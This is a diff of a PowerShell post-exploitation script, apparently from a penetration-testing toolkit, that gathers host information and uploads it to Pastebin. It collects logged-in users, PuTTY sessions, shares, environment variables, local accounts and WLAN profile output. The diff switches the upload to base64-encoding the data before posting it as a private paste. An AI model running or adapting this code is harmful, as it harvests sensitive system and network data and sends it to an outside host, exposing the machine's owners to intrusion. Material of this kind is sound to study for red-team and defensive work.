@@ -20,7 +20,7 @@ Username for the pastebin account where you would upload the data.
 Password for the pastebin account where you would upload the data.
 
 .EXAMPLE
-PS > Information_Gather dev_key username password
+PS > .\Information_Gather.ps1 dev_key username password
 
 .LINK
 http://labofapenetrationtester.blogspot.com/
@@ -45,8 +45,7 @@ $http_request.setRequestHeader("Content-length", $parameters.length);
 $http_request.setRequestHeader("Connection", "close") 
 $http_request.send($parameters) 
 $script:session_key=$http_request.responseText 
-$http_request.responseText 
-} 
+}
 function registry_values($regkey, $regvalue,$child) 
 { 
 if ($child -eq "no"){$key = get-item $regkey} 
@@ -64,7 +63,7 @@ $output = "Logged in users:`n" + (registry_values "hklm:\software\microsoft\wind
 $output = $output + "`n Powershell environment:`n" + (registry_values "hklm:\software\microsoft\powershell" "allname") 
 $output = $output + "`n Putty trusted hosts:`n" + (registry_values "hkcu:\software\simontatham\putty" "allname") 
 $output = $output + "`n Putty saved sessions:`n" + (registry_values "hkcu:\software\simontatham\putty\sessions" "all") 
-$output = $output + "`n Recently used commands:`n" + (registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no") 
+#$output = $output + "`n Recently used commands:`n" + (registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no") 
 $output = $output + "`n Shares on the machine:`n" + (registry_values "hklm:\SYSTEM\CurrentControlSet\services\LanmanServer\Shares" "all" "no") 
 $output = $output + "`n Environment variables:`n" + (registry_values "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "all" "no") 
 $output = $output + "`n More details for current user:`n" + (registry_values "hkcu:\Volatile Environment" "all" "no") 
@@ -74,15 +73,15 @@ $output = $output + "`n Installed Applications:`n" + (registry_values "hklm:\SOF
 $output = $output + "`n Installed Applications for current user:`n" + (registry_values "hkcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname") 
 $output = $output + "`n Domain Name:`n" + (registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\" "all" "no") 
 $output = $output + "`n Contents of /etc/hosts:`n" + (get-content -path "C:\windows\System32\drivers\etc\hosts") 
+#####INSTALLED PATCHES#######################
 $output = $output + "`n Running Services:`n" + (net start) 
 $output = $output + "`n Account Policy:`n" + (net accounts) 
 $output = $output + "`n Local users:`n" + (net user) 
 $output = $output + "`n Local Groups:`n" + (net localgroup) 
 $output = $output + "`n WLAN Info:`n" + (netsh wlan show all) 
-$output = $output.Replace("/","\") #This is to stop pastebin from marking the paste as spam
-$output = $output.Replace("www","uuu") #This is to stop pastebin from marking the paste as spam
+$utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($output)
+$base64 = [System.Convert]::ToBase64String($utfbytes)
 Post_http "http://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
-Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$output&api_paste_private=2" 
-$output
+Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$paste_name&api_paste_code=$base64&api_paste_private=2" 
 }
 Information_Gather
